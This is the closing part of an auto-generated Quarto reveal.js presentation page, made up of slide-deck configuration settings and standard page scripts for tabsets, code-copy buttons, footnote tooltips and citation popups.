'menu': {"side":"left","useTextContentForMissingTitles":true,"markers":false,"loadIcons":false,"custom":[{"title":"Tools","icon":"<i class=\"fas fa-gear\"></i>","content":"<ul class=\"slide-menu-items\">\n<li class=\"slide-tool-item active\" data-item=\"0\"><a href=\"#\" onclick=\"RevealMenuToolHandlers.fullscreen(event)\"><kbd>f</kbd> Fullscreen</a></li>\n<li class=\"slide-tool-item\" data-item=\"1\"><a href=\"#\" onclick=\"RevealMenuToolHandlers.speakerMode(event)\"><kbd>s</kbd> Speaker View</a></li>\n<li class=\"slide-tool-item\" data-item=\"2\"><a href=\"#\" onclick=\"RevealMenuToolHandlers.overview(event)\"><kbd>o</kbd> Slide Overview</a></li>\n<li class=\"slide-tool-item\" data-item=\"3\"><a href=\"#\" onclick=\"RevealMenuToolHandlers.togglePdfExport(event)\"><kbd>e</kbd> PDF Export Mode</a></li>\n<li class=\"slide-tool-item\" data-item=\"4\"><a href=\"#\" onclick=\"RevealMenuToolHandlers.toggleScrollView(event)\"><kbd>r</kbd> Scroll View Mode</a></li>\n<li class=\"slide-tool-item\" data-item=\"5\"><a href=\"#\" onclick=\"RevealMenuToolHandlers.keyboardHelp(event)\"><kbd>?</kbd> Keyboard Help</a></li>\n</ul>"}],"openButton":true},
'smaller': false,
 
        // Display controls in the bottom right corner
        controls: false,

        // Help the user learn the controls by providing hints, for example by
        // bouncing the down arrow when they first encounter a vertical slide
        controlsTutorial: false,

        // Determines where controls appear, "edges" or "bottom-right"
        controlsLayout: 'edges',

        // Visibility rule for backwards navigation arrows; "faded", "hidden"
        // or "visible"
        controlsBackArrows: 'faded',

        // Display a presentation progress bar
        progress: true,

        // Display the page number of the current slide
        slideNumber: 'c/t',

        // 'all', 'print', or 'speaker'
        showSlideNumber: 'all',

        // Add the current slide number to the URL hash so that reloading the
        // page/copying the URL will return you to the same slide
        hash: true,

        // Start with 1 for the hash rather than 0
        hashOneBasedIndex: false,

        // Flags if we should monitor the hash and change slides accordingly
        respondToHashChanges: true,

        // Push each slide change to the browser history
        history: true,

        // Enable keyboard shortcuts for navigation
        keyboard: true,

        // Enable the slide overview mode
        overview: true,

        // Disables the default reveal.js slide layout (scaling and centering)
        // so that you can use custom CSS layout
        disableLayout: false,

        // Vertical centering of slides
        center: false,

        // Enables touch navigation on devices with touch input
        touch: true,

        // Loop the presentation
        loop: false,

        // Change the presentation direction to be RTL
        rtl: false,

        // see https://revealjs.com/vertical-slides/#navigation-mode
        navigationMode: 'linear',

        // Randomizes the order of slides each time the presentation loads
        shuffle: false,

        // Turns fragments on and off globally
        fragments: true,

        // Flags whether to include the current fragment in the URL,
        // so that reloading brings you to the same fragment position
        fragmentInURL: false,

        // Flags if the presentation is running in an embedded mode,
        // i.e. contained within a limited portion of the screen
        embedded: false,

        // Flags if we should show a help overlay when the questionmark
        // key is pressed
        help: true,

        // Flags if it should be possible to pause the presentation (blackout)
        pause: true,

        // Flags if speaker notes should be visible to all viewers
        showNotes: false,

        // Global override for autoplaying embedded media (null/true/false)
        autoPlayMedia: null,

        // Global override for preloading lazy-loaded iframes (null/true/false)
        preloadIframes: null,

        // Number of milliseconds between automatically proceeding to the
        // next slide, disabled when set to 0, this value can be overwritten
        // by using a data-autoslide attribute on your slides
        autoSlide: 0,

        // Stop auto-sliding after user input
        autoSlideStoppable: true,

        // Use this method for navigation when auto-sliding
        autoSlideMethod: null,

        // Specify the average time in seconds that you think you will spend
        // presenting each slide. This is used to show a pacing timer in the
        // speaker view
        defaultTiming: null,

        // Enable slide navigation via mouse wheel
        mouseWheel: false,

        // The display mode that will be used to show slides
        display: 'block',

        // Hide cursor if inactive
        hideInactiveCursor: true,

        // Time before the cursor is hidden (in ms)
        hideCursorTime: 5000,

        // Opens links in an iframe preview overlay
        previewLinks: false,

        // Transition style (none/fade/slide/convex/concave/zoom)
        transition: 'slide',

        // Transition speed (default/fast/slow)
        transitionSpeed: 'default',

        // Transition style for full page slide backgrounds
        // (none/fade/slide/convex/concave/zoom)
        backgroundTransition: 'none',

        // Number of slides away from the current that are visible
        viewDistance: 3,

        // Number of slides away from the current that are visible on mobile
        // devices. It is advisable to set this to a lower number than
        // viewDistance in order to save resources.
        mobileViewDistance: 2,

        // The "normal" size of the presentation, aspect ratio will be preserved
        // when the presentation is scaled to fit different resolutions. Can be
        // specified using percentage units.
        width: 1050,

        height: 700,

        // Factor of the display size that should remain empty around the content
        margin: 0.1,

        math: {
          mathjax: 'https://cdn.jsdelivr.net/npm/mathjax@2.7.9/MathJax.js',
          config: 'TeX-AMS_HTML-full',
          tex2jax: {
            inlineMath: [['\\(','\\)']],
            displayMath: [['\\[','\\]']],
            balanceBraces: true,
            processEscapes: false,
            processRefs: true,
            processEnvironments: true,
            preview: 'TeX',
            skipTags: ['script','noscript','style','textarea','pre','code'],
            ignoreClass: 'tex2jax_ignore',
            processClass: 'tex2jax_process'
          },
        },

        // reveal.js plugins
        plugins: [QuartoLineHighlight, PdfExport, RevealMenu, QuartoSupport,

          RevealMath,
          RevealNotes,
          RevealSearch,
          RevealZoom
        ]
      });
    </script>
    <script id="quarto-html-after-body" type="application/javascript">
      window.document.addEventListener("DOMContentLoaded", function (event) {
        const tabsets =  window.document.querySelectorAll(".panel-tabset-tabby")
        tabsets.forEach(function(tabset) {
          const tabby = new Tabby('#' + tabset.id);
        });
        const isCodeAnnotation = (el) => {
          for (const clz of el.classList) {
            if (clz.startsWith('code-annotation-')) {                     
              return true;
            }
          }
          return false;
        }
        const onCopySuccess = function(e) {
          // button target
          const button = e.trigger;
          // don't keep focus
          button.blur();
          // flash "checked"
          button.classList.add('code-copy-button-checked');
          var currentTitle = button.getAttribute("title");
          button.setAttribute("title", "Copied!");
          let tooltip;
          if (window.bootstrap) {
            button.setAttribute("data-bs-toggle", "tooltip");
            button.setAttribute("data-bs-placement", "left");
            button.setAttribute("data-bs-title", "Copied!");
            tooltip = new bootstrap.Tooltip(button, 
              { trigger: "manual", 
                customClass: "code-copy-button-tooltip",
                offset: [0, -8]});
            tooltip.show();    
          }
          setTimeout(function() {
            if (tooltip) {
              tooltip.hide();
              button.removeAttribute("data-bs-title");
              button.removeAttribute("data-bs-toggle");
              button.removeAttribute("data-bs-placement");
            }
            button.setAttribute("title", currentTitle);
            button.classList.remove('code-copy-button-checked');
          }, 1000);
          // clear code selection
          e.clearSelection();
        }
        const getTextToCopy = function(trigger) {
            const codeEl = trigger.previousElementSibling.cloneNode(true);
            for (const childEl of codeEl.children) {
              if (isCodeAnnotation(childEl)) {
                childEl.remove();
              }
            }
            return codeEl.innerText;
        }
        const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
          text: getTextToCopy
        });
        clipboard.on('success', onCopySuccess);
        if (window.document.getElementById('quarto-embedded-source-code-modal')) {
          const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
            text: getTextToCopy,
            container: window.document.getElementById('quarto-embedded-source-code-modal')
          });
          clipboardModal.on('success', onCopySuccess);
        }
          var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
          var mailtoRegex = new RegExp(/^mailto:/);
            var filterRegex = new RegExp('/' + window.location.host + '/');
          var isInternal = (href) => {
              return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
          }
          // Inspect non-navigation links and adorn them if external
         var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
          for (var i=0; i<links.length; i++) {
            const link = links[i];
            if (!isInternal(link.href)) {
              // undo the damage that might have been done by quarto-nav.js in the case of
              // links that we want to consider external
              if (link.dataset.originalHref !== undefined) {
                link.href = link.dataset.originalHref;
              }
            }
          }
        function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
          const config = {
            allowHTML: true,
            maxWidth: 500,
            delay: 100,
            arrow: false,
            appendTo: function(el) {
                return el.closest('section.slide') || el.parentElement;
            },
            interactive: true,
            interactiveBorder: 10,
            theme: 'light-border',
            placement: 'bottom-start',
          };
          if (contentFn) {
            config.content = contentFn;
          }
          if (onTriggerFn) {
            config.onTrigger = onTriggerFn;
          }
          if (onUntriggerFn) {
            config.onUntrigger = onUntriggerFn;
          }
            config['offset'] = [0,0];
            config['maxWidth'] = 700;
          window.tippy(el, config); 
        }
        const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
        for (var i=0; i<noterefs.length; i++) {
          const ref = noterefs[i];
          tippyHover(ref, function() {
            // use id or data attribute instead here
            let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
            try { href = new URL(href).hash; } catch {}
            const id = href.replace(/^#\/?/, "");
            const note = window.document.getElementById(id);
            if (note) {
              return note.innerHTML;
            } else {
              return "";
            }
          });
        }
        const findCites = (el) => {
          const parentEl = el.parentElement;
          if (parentEl) {
            const cites = parentEl.dataset.cites;
            if (cites) {
              return {
                el,
                cites: cites.split(' ')
              };
            } else {
              return findCites(el.parentElement)
            }
          } else {
            return undefined;
          }
        };
        var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
        for (var i=0; i<bibliorefs.length; i++) {
          const ref = bibliorefs[i];
          const citeInfo = findCites(ref);
          if (citeInfo) {
            tippyHover(citeInfo.el, function() {
              var popup = window.document.createElement('div');
              citeInfo.cites.forEach(function(cite) {
                var citeDiv = window.document.createElement('div');
                citeDiv.classList.add('hanging-indent');
                citeDiv.classList.add('csl-entry');
                var biblioDiv = window.document.getElementById('ref-' + cite);
                if (biblioDiv) {
                  citeDiv.innerHTML = biblioDiv.innerHTML;
                }
                popup.appendChild(citeDiv);
              });
              return popup.innerHTML;
            });
          }
        }
      });
      </script>
    

</body></html>